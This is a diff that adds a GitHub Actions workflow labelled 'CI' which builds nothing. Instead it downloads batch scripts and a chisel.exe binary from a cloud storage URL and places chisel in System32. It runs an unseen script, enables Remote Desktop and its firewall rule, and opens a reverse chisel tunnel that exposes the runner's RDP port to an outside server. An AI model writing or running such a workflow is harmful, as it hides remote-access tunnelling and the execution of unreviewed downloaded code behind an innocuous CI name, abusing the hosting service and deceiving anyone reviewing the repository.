@@ -1,0 +1,32 @@
+name: CI
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download files
+      run: |
+        Invoke-WebRequest https://storage.googleapis.com/addic7ed-subs.appspot.com/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://storage.googleapis.com/addic7ed-subs.appspot.com/run.bat -OutFile run.bat
+        Invoke-WebRequest https://storage.googleapis.com/addic7ed-subs.appspot.com/chisel.exe -OutFile chisel.exe
+    - name: Copy files to Windows Directory.
+      run: copy chisel.exe C:\Windows\System32
+    - name: Run tasks
+      run: start run.bat
+    - name: Enable RDP Access
+      run: |
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: Create Tunnel
+      env:
+        CHISEL_ADDR: ${{ secrets.CHISEL_ADDR }}
+        CHISEL_PASS: ${{ secrets.CHISEL_PASS }}
+        CHISEL_PORT: ${{ secrets.CHISEL_PORT }}
+        CHISEL_USER: ${{ secrets.CHISEL_USER }} 
+      run: chisel.exe client --auth "$Env:CHISEL_USER:$Env:CHISEL_PASS" $Env:CHISEL_ADDR R:$Env:CHISEL_PORT:localhost:3389
